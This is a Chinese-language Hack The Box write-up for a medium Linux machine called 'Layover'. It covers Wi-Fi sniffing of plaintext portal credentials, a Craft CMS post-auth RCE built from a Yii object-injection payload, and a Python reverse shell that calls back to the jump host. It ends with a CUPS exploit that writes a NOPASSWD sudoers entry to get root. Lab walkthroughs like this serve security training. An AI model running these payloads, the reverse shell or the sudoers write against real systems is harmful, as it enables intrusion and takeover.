---
title: "Layover - Linux - Medium"
date: 2026-10-04
draft: false
description: "Layover 是一台机场主题的中等难度 Linux 机器。攻击链分三段:先用题目提供的凭据 RDP 登入跳板机,用无线网卡监听 802.11 明文流量获取门户凭据;再通过 Craft CMS 的认证后 RCE 拿到 www-data;最后"
tags: ["HTB", "Linux", "Medium", "Craft CMS", "CUPS", "802.11", "CVE", "提权"]
categories: ["Writeup"]
isStarred: false
---

Layover 是一台机场主题的中等难度 Linux 机器。攻击链分三段:先用题目提供的凭据 RDP 登入跳板机,用无线网卡监听 802.11 明文流量获取门户凭据;再通过 Craft CMS 的认证后 RCE 拿到 www-data;最后用 CUPS 本地提权至 root。

- **环境**:HTB · Linux · Medium
- **目标**:`10.129.24.144`(airside-ws01),门户 `portal.international.htb`
- **日期**:`2026-10-04`


![layover 攻击路径](/images/layover-attack-path.png)

---

## 0. 准备

确认目标可达。HTB 的 IP 每次重连都可能变化,先记录当前 IP。

```bash
ping -c 2 10.129.24.144
```

---

## 1. 侦察 Recon

全端口扫描,确认攻击面。

```bash
nmap -sC -sV -p- -oA nmap/initial 10.129.24.144
```

**结果要点:**

| 端口 | 服务 | 版本 |
| :--- | :--- | :--- |
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 3389/tcp | RDP | xrdp (TLSv1.2) |

对外仅开放 22 与 3389,无 Web 服务。凭据由题目直接提供,说明入口不在对外服务上,而在跳板机所连的内网侧。

---

## 2. 枚举 Enumeration

### 2.1 SSH — 非入口

题目提供的凭据为 `contractor:Contractor2026!`,先用它尝试 SSH:

```bash
ssh contractor@10.129.24.144
# Permission denied (publickey,password)
```

密码认证失败。该凭据的实际用途是 RDP,SSH 在此不构成入口。

### 2.2 RDP — 入口

同一组凭据通过 RDP 可直接登入桌面:

```bash
xfreerdp /v:10.129.24.144 /u:contractor /p:'Contractor2026!' /cert:ignore
```

登入后确认网卡配置,发现跳板机同时接入两个网络:

```bash
ip -4 addr show
```

```
inet 10.159.143.45/24  dev eth0      # 内网
inet 10.13.37.182/24   dev wlan2     # 已连接 "HTB International WiFi"
```

跳板机已接入无线网络 "HTB International WiFi"。这是整条攻击链的关键——攻击者与目标门户处于同一无线网段。

### 2.3 无线接口

无线设备有两个接口:

```bash
iw dev
```

`wlan2` 已关联 AP;`wlan3` 可切换为监听模式用于抓包(mac80211 允许在同一物理设备上开第二个虚拟接口)。

---

## 3. 初始访问 Foothold

### 3.1 监听明文凭据

将 `wlan3` 切换为监听模式:

```bash
sudo iw dev wlan3 set type monitor
sudo ip link set wlan3 up
```

抓包。注意:在 802.11 帧上,`tshark` 的 `-f`(BPF 捕获过滤器)不生效,必须使用 `-Y`(显示过滤器)。

```bash
sudo tshark -i wlan3 -Y 'http.request.method == "POST"' -T fields \
  -e http.host -e http.request.uri -e urlencoded-form.value
```

捕获需要有实际流量经过,同时触发门户登录。随后捕获到员工 `jenny` 的凭据:

```
http.host = portal.international.htb
http.request.uri = /index.php?action=users/login
urlencoded-form.value = loginName=jenny&password=Fl1ghtDeck2026!
```

门户以 HTTP 明文提交表单,凭据直接暴露在链路上。

**获得凭据:**

```text
jenny : Fl1ghtDeck2026!
```

### 3.2 门户指纹 — Craft CMS

以该凭据登录 `http://portal.international.htb/`,为 Craft CMS 后台。确认版本与入口:

```bash
curl -s http://portal.international.htb/admin/ | grep -i craft
```

Craft CMS **5.9.8**。CVE-2026-44011 影响 Craft ≤ 4.17.11 / ≤ 5.9.17,该版本在受影响范围内。

### 3.3 CVE-2026-44011 — 后台 RCE(www-data)

Craft 5 的 `element-search/search` action 存在认证后 RCE:`condition` 参数未经 `cleanseConfig()` 清洗即传入 `ElementCondition::createCondition()`,构成 Yii 对象注入原语——`as <name>`、`__class`、`__construct()` 等特殊键可在实例化阶段挂载任意 behavior。

利用链:

1. 用 `craft\elements\conditions\ElementCondition` 承载一个 `fieldLayouts` 数组;
2. 注入 Yii behavior:`yii\behaviors\AttributeTypecastBehavior`;
3. 将其 `typecastBeforeSave` 指定为 `['Psy\Readline\Hoa\ConsoleProcessus', 'execute']`,即以任意字符串作为命令执行;
4. `on *` → `self::beforeSave`,保证 behavior 在保存前触发。

单个请求即可执行命令。`ConsoleProcessus::execute` 不解析 shell 元字符(管道 `|` 无效),因此每条命令需用 `/bin/bash -c '<cmd>'` 包裹。

**取 CSRF 并登录:**

```bash
# 先取 CSRF,再登录(均在 action 形式的 API 上)
curl -s -c jar.txt \
  'http://portal.international.htb/index.php?action=users/session-info' \
  -H 'Accept: application/json'

curl -s -b jar.txt -c jar.txt \
  'http://portal.international.htb/index.php?action=users/login' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data 'loginName=jenny&password=Fl1ghtDeck2026!&CRAFT_CSRF_TOKEN=<上面拿到的 token>'
```

**注入 payload:**

```python
BS = chr(92)  # 反斜杠,避免在多层转义里被吃掉
cat  = 'craft'+BS+'elements'+BS+'Category'
cond = 'craft'+BS+'elements'+BS+'conditions'+BS+'ElementCondition'
atyc = 'yii'+BS+'behaviors'+BS+'AttributeTypecastBehavior'
cproc= 'Psy'+BS+'Readline'+BS+'Hoa'+BS+'ConsoleProcessus'

payload = {
  'elementType': cat, 'siteId': 1, 'search': '',
  'condition': {
    'class': cond, 'elementType': cat,
    'fieldLayouts': [{
      'as rce': {
        '__class': atyc,
        '__construct()': [{
          'attributeTypes': {'typecastBeforeSave': [cproc, 'execute']},
          'typecastBeforeSave': "/bin/bash -c '<命令>'"
        }]
      },
      'on *': 'self::beforeSave'
    }]
  }
}
# POST 到 /index.php?p=admin/actions/element-search/search
```

**获取 shell:** 目标对入站连接有防火墙,使用反向 shell。跳板机(10.13.37.182)监听,portal 回连:

```bash
# 跳板机
nc -lvnp 4445
```

```
# portal
python3 -c "import socket,os,pty;s=socket.socket();s.connect(('10.13.37.182',4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
```

**升级为交互式终端:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

此时身份为 `www-data`。

### 3.4 从 .env 密钥到 SSH 密码

读取 Craft 的 `.env`,获取 `CRAFT_SECURITY_KEY`(Craft 用它加密数据库敏感字段):

```bash
cat /var/www/portal/.env | grep CRAFT_SECURITY_KEY
```

`aporter` 的邮件中继密码在数据库中为密文。直接调用 Craft 自身的解密方法。注意 `bootstrap.php` 只定义常量并注册 autoload,返回应用对象的是 `console.php`:

```php
<?php
require "/var/www/portal/bootstrap.php";
$app = require CRAFT_VENDOR_PATH . "/craftcms/cms/bootstrap/console.php";
echo Craft::$app->security->decryptByKey(base64_decode("<DB里的密文>"));
echo PHP_EOL;
```

```bash
php /tmp/dec2.php
# Skyp0rt_Relay!26
```

**获得凭据:**

```text
aporter : Skyp0rt_Relay!26
```

### 3.5 SSH 登录,获取 user.txt

```bash
ssh aporter@10.13.37.10
```

```bash
cat ~/user.txt
```

**user.txt:** `848fd102b3f8cb237c7b2b62********`

---

## 4. 权限提升

### 4.1 本地枚举

```bash
id; sudo -l; uname -a
```

- `id` → `uid=1001(aporter)`,普通用户;
- `sudo -l` → 需要密码,无免密条目;
- `/etc/sudoers.d/` 对 aporter 不可读(`ls: Permission denied`)。

常规项(SUID、cron、可写服务)均无突破。突破口在本地监听的服务:

```bash
ss -tlnp | grep 631
```

```
LISTEN 0 4096 127.0.0.1:631 0.0.0.0:*
```

CUPS 监听 `127.0.0.1:631`,版本 2.4.16:

```bash
cups-config --version   # 2.4.16
```

CUPS 以 root 运行,该版本存在 CVE-2026-34990。

### 4.2 CVE-2026-34990 — CUPS 任意文件写提权

原理分两步:

**(1) 获取 Local 认证 token。** CUPS 的管理操作需本地认证。在 localhost 上架设一个伪造的 IPP 服务,用 `ipptool` 的 `cups-create-local-printer.test` 使 CUPS 向它发起连接;CUPS 认证时会发送 `Authorization: Local <token>` 头,在验证之前将其截获。首个连接返回 `401 WWW-Authenticate: Local trc="y"`,以确保干净地捕获一次。

**(2) 用 token 创建本地打印机,`device-uri` 指向任意文件。** CUPS 允许本地打印机的 `device-uri` 设为 `file://` 路径。随后提交 `document-format: application/vnd.cups-raw` + `compression: gzip` 的打印任务,cupsd 会解压任务数据并原样写入该路径,且以 root 身份写入。

目标文件设为 `/etc/sudoers.d/aporter-pwn`,内容:

```text
aporter ALL=(ALL) NOPASSWD: ALL
```

创建打印机的请求需保持 socket 打开(维持注册在途),同时并发执行 add/modify、accept-jobs、resume 与打印任务投递。这是一场竞态,脚本默认重试 12 次。

```bash
CUPS_ATTACKER=aporter CUPS_TARGET=/etc/sudoers.d/aporter-pwn python3 /tmp/cups.py
```

```
[+] Captured token: E49EF7659E2B1923B1B5F47B4D78C101
[*] Candidate attempt 1/12
[-] Attempt did not succeed.
[*] Candidate attempt 2/12
uid=0(root) gid=0(root) groups=0(root)
[+] SUCCESS
```

第 2 次尝试成功。验证:

```bash
sudo -n cat /etc/sudoers.d/aporter-pwn
# aporter ALL=(ALL) NOPASSWD: ALL
```

### 4.3 获取 root.txt

```bash
sudo -n cat /root/root.txt
```

**root.txt:** `ee3d9f14a4dda8b4819a24a7********`

---

## 5. 收尾

这台机器考察的核心是受限环境下的横向移动能力:

- **入口在无线网内,不在端口上。** SSH 是干扰项;第一步是登入跳板机并将其作为监听点。明文 Wi-Fi 加 HTTP 门户,凭据直接暴露在链路上。
- **Web 侧是标准的认证后 RCE**,难点在构造 Yii 对象注入的 payload。拿到 www-data 后,`.env` 密钥 → 解密数据库 → 得到 SSH 密码,是 Craft 题的常见收尾。
- **提权不是 SUID 或 cron**,而是"以 root 运行的本地服务 + 可写任意文件的 API"。

重复劳动:3.3 中反复调整 payload 的失败请求(见附录坑 2),以及对 SSH 的初始尝试。

---

## 附录:趟过的坑 / 兔子洞

> 本节记录失败路径。每条按「预期 → 实际 → 结论」组织。

| # | 坑 | 类别 |
| :---: | :--- | :--- |
| 0 | 杀软把不存在的邮件端口伪装成开放 | 本地环境 |
| 1 | monitor mode 抓不到包 | 工具用法 |
| 2 | Craft RCE 一直 HTTP 500 | 转义 / 编码 |
| 3 | PHP 解密脚本报 int 错误 | 语言细节 |
| 4 | 反向 shell 被本地防火墙挡住 | 网络环境 |
| 5 | `sudo` 吃掉预输入的命令 | 交互终端 |

---

### 坑 0 · 杀软把不存在的邮件端口伪装成开放

**预期:** 靶机开放邮件服务(`fscan` 报出 `25/110/143`),应从 SMTP / POP3 / IMAP 入手。

**实际:** 是本地火绒的驱动级出站过滤,对本机发往 `25/110/143` 的连接做"假接通",握手在本机完成,流量未出网卡。判据:

| 测试对象 | 连接耗时 | 说明 |
| :--- | :--- | :--- |
| 目标 `25/tcp` | **0–25 ms** 即"接通" | 本地伪造,非真实链路 |
| 目标 `22 / 3389` | 320 ms | 真实链路(到澳大利亚的往返) |
| `8.8.8.8:25`、`1.1.1.1:25` | 12–16 ms"接通" | 二者均不提供 SMTP |
| 目标未开放的 `45678` | 3.7 s 才 refused | 真实链路 + SYN 重传 |

> **结论:** 关闭防护后重扫,靶机真实仅开放 22 与 3389。出现"秒接通"的端口时,先用一个不提供该服务的地址做对照。

---

### 坑 1 · monitor mode 抓不到包

**预期:** `tshark -i wlan3 -f 'tcp port 80'`,以 BPF 捕获过滤器拦截即可。

**实际:** 两层问题。① BPF 捕获过滤器对 802.11 不适用,`-f` 静默失效,恒返回 0 行,须改用显示过滤器 `-Y`。② 需要有实际流量经过,否则窗口内没有可抓的帧。

> **结论:** 802.11 抓包用 `-Y`;抓不到时先确认链路上是否有流量。

---

### 坑 2 · Craft RCE 一直 HTTP 500

**预期:** payload 可直接复用。

**实际:** 两个问题叠加——

- 类名中的反斜杠在传递过程中被吃掉(`\\` 塌缩为 `\`,`\U` 触发 PHP 的 unicode 转义错误)。解法:用 `chr(92)` 拼类名,脚本以 base64 传输。
- 密码中的 `!` 触发 bash 历史展开(`event not found`)。解法:`set +H`。

> **结论:** 多层转义环境下,反斜杠一律按"会丢失"处理。

---

### 坑 3 · PHP 解密脚本报 "Call to a member function on int"

**预期:** `$app = require "bootstrap.php";` 后即可调用 `$app->security->...`。

**实际:** `bootstrap.php` 仅定义常量并注册 autoload,返回值为 int。应用对象需 `require "vendor/craftcms/cms/bootstrap/console.php"`。

> **结论:** 先确认 bootstrap 文件的返回值,不要默认它返回应用对象。

---

### 坑 4 · 反向 shell 被本地防火墙挡住

**预期:** 监听端口,等待 portal 回连。

**实际:** 跳板机的 TAP 网卡被 Windows 归类为 Public 配置,入站默认被防火墙拦截,需显式放行规则(需要管理员权限,经 UAC 提权添加)。

> **结论:** 反向 shell 失败时,本地防火墙同样是排查方向。

---

### 坑 5 · `sudo` 会"吃掉"预输入的命令

**预期:** 通过中继通道一次性发送多条命令。

**实际:** `sudo` 会清空 pty 的预输入缓冲,后续命令丢失。需逐行发送并保留延时。

> **结论:** 在交互式 pty 上执行 `sudo`,逐条发送。
